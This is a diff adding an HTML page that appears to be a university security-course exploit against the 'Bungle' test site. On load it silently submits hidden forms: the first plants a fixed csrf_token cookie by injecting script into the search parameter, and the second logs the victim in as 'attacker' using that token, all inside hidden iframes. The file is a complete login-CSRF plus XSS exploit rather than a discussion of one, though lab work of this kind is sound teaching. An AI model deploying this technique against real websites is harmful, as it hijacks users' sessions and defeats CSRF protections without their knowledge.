@@ -1,0 +1,30 @@
+
+<body onload="document.Form1.submit()">
+  <!-- getform1 set csrf_token in cookie (the php response to set cookie with the token)  -->
+  <form action="http://bungle-cs461.cs.illinois.edu/search" method="GET" target="Frame1" name="Form1"> 
+    <input type="hidden" name="csrfdefense" value="1"/>
+    <input type="hidden" name="xssdefense" value="0"/>
+    <!-- set cookie -->
+    <input type="hidden" name="q" value="<script>document.cookie='csrf_token=d5a07466b10bf4dd46cd14a6f50d5a05'</script>"/> 
+  </form> 
+<!-- postform2,login with know csrf, thus the client has been logged in -->
+  <form action="http://bungle-cs461.cs.illinois.edu/login" method="POST" target="Frame2" name="Form2"> 
+    <input type="hidden" name="csrfdefense" value="1"/>
+    <input type="hidden" name="xssdefense" value="0"/>
+  <input type="hidden" name="username" value="attacker"/>
+    <input type="hidden" name="password" value="l33th4x"/>
+    <!-- set token-->
+    <input type="hidden" name="csrf_token" value="d5a07466b10bf4dd46cd14a6f50d5a05"/>
+  </form>
+ 
+  <iframe name="Frame1" style="display: none;" onload="second()";></iframe>
+  <iframe name="Frame2" style="display: none;"></iframe>
+</body>
+
+<script type="text/javascript">
+function second(){
+  document.Form2.submit();
+}
+
+</script>
+
